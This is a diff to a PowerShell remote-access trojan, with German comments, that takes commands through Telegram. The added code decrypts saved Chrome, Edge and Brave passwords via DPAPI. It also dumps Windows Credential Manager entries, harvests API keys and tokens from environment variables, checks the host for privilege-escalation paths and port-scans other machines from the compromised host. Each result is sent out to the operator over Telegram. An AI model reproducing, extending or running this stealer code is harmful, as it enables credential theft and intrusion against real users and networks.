@@ -36,7 +36,12 @@ COMMANDS = {
     "!keylog stop":      "Keylogger stoppen + Log senden",
     "!keylog dump":      "Aktuellen Keylog senden ohne zu stoppen",
     "!wifi":             "Gespeicherte WLAN-Passwörter auslesen",
-    "!browsers":         "Browser-Passwörter (Pfade zu Credential-Stores)",
+    "!browsers":         "Chrome/Firefox/Edge Passwörter via DPAPI dumpen",
+    "!creds":            "Windows Credential Manager + LSA Secrets",
+    "!privesc":          "Privilege Escalation Checks (UAC, Token, unquoted paths...)",
+    "!netstat":          "Aktive Netzwerkverbindungen + lauschende Ports",
+    "!portscan <ip>":    "Schneller Port-Scan vom kompromittierten Host",
+    "!env":              "Umgebungsvariablen (API Keys, Tokens, Passwörter)",
     "!persist":          "Als Scheduled Task persistieren",
     "!unpersist":        "Scheduled Task entfernen",
     "!exit":             "Agent beenden",
@@ -172,6 +177,12 @@ function Handle-Command {
         $msg += "!clipboard        — Zwischenablage`n"
         $msg += "!keylog start/stop/dump`n"
         $msg += "!wifi             — WLAN-Passwörter`n"
+        $msg += "!browsers         — Browser-Passwörter (DPAPI)`n"
+        $msg += "!creds            — Credential Manager`n"
+        $msg += "!privesc          — PrivEsc Checks`n"
+        $msg += "!netstat          — Netzwerk-Verbindungen`n"
+        $msg += "!portscan &lt;ip&gt;   — Port-Scan`n"
+        $msg += "!env              — API-Keys in Umgebung`n"
         $msg += "!persist          — Persistenz`n"
         $msg += "!exit             — Agent beenden"
         TG-Send $msg
@@ -312,6 +323,175 @@ function Handle-Command {
             $result += "  $p  →  $pw`n"
         }
         TG-Send "<pre>$result</pre>"
+        return
+    }
+
+    if ($Text -eq "!browsers") {
+        # Chrome/Edge DPAPI Password Dump via CryptUnprotectData
+        $chromePaths = @(
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Chromium\User Data\Default\Login Data"
+        )
+        $result = "Browser Credentials:`n"
+        $found = 0
+
+        Add-Type -AssemblyName System.Security
+        foreach ($path in $chromePaths) {
+            if (-not (Test-Path $path)) { continue }
+            $browser = ($path -split "\\")[5]
+            # Copy DB (Chrome locks it)
+            $tmp = "$env:TEMP\ldb_$found.tmp"
+            Copy-Item $path $tmp -Force -ErrorAction SilentlyContinue
+
+            try {
+                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp;Version=3;Read Only=True;")
+                $conn.Open()
+                $cmd = $conn.CreateCommand()
+                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user=0"
+                $reader = $cmd.ExecuteReader()
+                while ($reader.Read()) {
+                    $url = $reader[0]; $user = $reader[1]
+                    $encPw = $reader.GetValue(2)
+                    try {
+                        $decPw = [System.Text.Encoding]::UTF8.GetString(
+                            [System.Security.Cryptography.ProtectedData]::Unprotect(
+                                $encPw, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
+                    } catch { $decPw = "(encrypted)" }
+                    if ($user -or $decPw -ne "(encrypted)") {
+                        $result += "[$browser] $url`n  User: $user  |  Pass: $decPw`n"
+                        $found++
+                    }
+                }
+                $conn.Close()
+            } catch {
+                # SQLite3 DLL nicht verfügbar — PowerShell Fallback
+                $result += "[$browser] DB gefunden (SQLite DLL benötigt fur Entschlüsselung)`n  Pfad: $path`n"
+            }
+            Remove-Item $tmp -ErrorAction SilentlyContinue
+        }
+
+        # Firefox: logins.json (Base64 + NSS crypto)
+        $ffProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -ErrorAction SilentlyContinue
+        foreach ($prof in $ffProfiles) {
+            $loginFile = Join-Path $prof.FullName "logins.json"
+            if (Test-Path $loginFile) {
+                $result += "[Firefox] Profil: $($prof.Name)`n  Logins.json: $loginFile`n"
+                $found++
+            }
+        }
+
+        if ($found -eq 0) { $result += "(keine Browser-Credentials gefunden)`n" }
+        $result += "`nGesamt: $found Einträge"
+        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
+        return
+    }
+
+    if ($Text -eq "!creds") {
+        # Windows Credential Manager
+        $result = "Windows Credential Manager:`n"
+        try {
+            $creds = cmdkey /list 2>&1 | Out-String
+            $result += $creds
+        } catch { $result += "(Zugriff verweigert)`n" }
+        # Umgebungsvariablen nach Tokens/Passwörtern
+        $result += "`nAPI-Keys/Tokens in Umgebungsvariablen:`n"
+        $keywords = @("key","token","secret","password","pass","api","auth","credential")
+        foreach ($entry in [System.Environment]::GetEnvironmentVariables().GetEnumerator()) {
+            foreach ($kw in $keywords) {
+                if ($entry.Key -like "*$kw*" -or $entry.Value -like "*$kw*") {
+                    $result += "  $($entry.Key) = $($entry.Value)`n"
+                    break
+                }
+            }
+        }
+        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
+        return
+    }
+
+    if ($Text -eq "!privesc") {
+        $r = "=== Privilege Escalation Checks ===`n`n"
+        # UAC Level
+        $uac = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA
+        $r += "[UAC] EnableLUA: $uac (0=disabled=instant privesc)`n"
+        $uacLevel = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -ErrorAction SilentlyContinue).ConsentPromptBehaviorAdmin
+        $r += "[UAC] ConsentPromptBehaviorAdmin: $uacLevel (0=no prompt)`n`n"
+        # Aktueller User + Gruppen
+        $r += "[USER] $(whoami) | Groups: $((whoami /groups 2>&1 | Select-String 'Mandatory Label') -join ', ')`n`n"
+        # AlwaysInstallElevated
+        $aie1 = (Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated
+        $aie2 = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated
+        if ($aie1 -eq 1 -and $aie2 -eq 1) { $r += "[!!!] AlwaysInstallElevated AKTIV → MSI als SYSTEM ausführen!`n" }
+        # Unquoted Service Paths
+        $r += "`n[Unquoted Service Paths]`n"
+        $svcs = Get-WmiObject win32_service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -match ' ' } | Select-Object Name,PathName
+        if ($svcs) { foreach ($s in $svcs) { $r += "  $($s.Name): $($s.PathName)`n" } }
+        else { $r += "  (keine gefunden)`n" }
+        # Writeable Directories in PATH
+        $r += "`n[Writeable PATH Dirs]`n"
+        foreach ($p in ($env:PATH -split ";")) {
+            if (Test-Path $p) {
+                $acl = (Get-Acl $p -ErrorAction SilentlyContinue).Access |
+                    Where-Object { $_.IdentityReference -match "Everyone|Users" -and $_.FileSystemRights -match "Write|FullControl" }
+                if ($acl) { $r += "  SCHREIBBAR: $p`n" }
+            }
+        }
+        # PowerShell Version
+        $r += "`n[PowerShell] v$($PSVersionTable.PSVersion) | CLR: $($PSVersionTable.CLRVersion)`n"
+        # .NET Version
+        $r += "[.NET] $(Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -Recurse | Get-ItemProperty -Name Version -ErrorAction 0 | Sort-Object Version | Select-Object -Last 1 -ExpandProperty Version)`n"
+        # Scheduled Tasks als SYSTEM
+        $r += "`n[Scheduled Tasks als SYSTEM (schreibbar)]`n"
+        $tasks = schtasks /query /fo LIST 2>&1 | Select-String "TaskName|Run As User" | Out-String
+        $r += ($tasks | Select-Object -First 20) + "`n"
+        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($r))</pre>"
+        return
+    }
+
+    if ($Text -eq "!netstat") {
+        $ns = netstat -ano 2>&1 | Out-String
+        $result = "Aktive Verbindungen:`n$ns"
+        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
+        return
+    }
+
+    if ($Text -match "^!portscan (.+)$") {
+        $target = $Matches[1].Trim()
+        $result = "Port-Scan $target (Top 20 Ports):`n"
+        $ports = @(21,22,23,25,53,80,110,135,139,143,443,445,1433,3306,3389,5432,5900,6379,8080,8443)
+        foreach ($port in $ports) {
+            try {
+                $tcp = New-Object System.Net.Sockets.TcpClient
+                $conn = $tcp.BeginConnect($target, $port, $null, $null)
+                $wait = $conn.AsyncWaitHandle.WaitOne(500, $false)
+                if ($wait -and !$tcp.Client.Connected -eq $false) {
+                    $result += "  :$port  OPEN`n"
+                }
+                $tcp.Close()
+            } catch {}
+        }
+        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
+        return
+    }
+
+    if ($Text -eq "!env") {
+        $result = "Umgebungsvariablen:`n"
+        $keywords = @("key","token","secret","password","pass","api","auth","aws","azure","gcp","db","database","mongo","redis","mysql","postgres","openai","github","gitlab")
+        foreach ($entry in [System.Environment]::GetEnvironmentVariables([System.EnvironmentVariableTarget]::Process).GetEnumerator()) {
+            foreach ($kw in $keywords) {
+                if ($entry.Key.ToLower() -like "*$kw*") {
+                    $result += "  $($entry.Key) = $($entry.Value)`n"
+                    break
+                }
+            }
+        }
+        # Alle anzeigen wenn nichts gefunden
+        if ($result -eq "Umgebungsvariablen:`n") {
+            $all = [System.Environment]::GetEnvironmentVariables() | Out-String
+            $result += $all
+        }
+        TG-Send "<pre>$([System.Web.HttpUtility]::HtmlEncode($result))</pre>"
         return
     }
 
